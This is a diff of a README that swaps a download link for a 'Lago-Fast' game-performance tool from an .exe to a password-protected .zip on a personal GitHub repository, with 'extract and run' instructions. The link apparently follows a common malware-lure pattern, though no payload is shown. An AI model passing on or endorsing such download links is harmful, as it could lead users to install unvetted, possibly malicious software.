@@ -28,7 +28,7 @@ This repository is for educational and personal use only. Use the software respo
 
 The tool is available as a password-protected archive – extract and run.
 
-📥 [Download `Lago-Fast-1.24.2.zip`](https://github.com/quangluc200601-bot/Lago-Fast-Enhance-FPS-in-games-Desktop/releases/download/game-software/LagoFast-1.24.2.exe)**
+📥 [Download `Lago-Fast-1.24.2.zip`](https://github.com/quangluc200601-bot/Lago-Fast-Enhance-FPS-in-games-Desktop/releases/download/game-software/LagoFast-1.24.2.zip)**
 
 ### Archive Contents
 
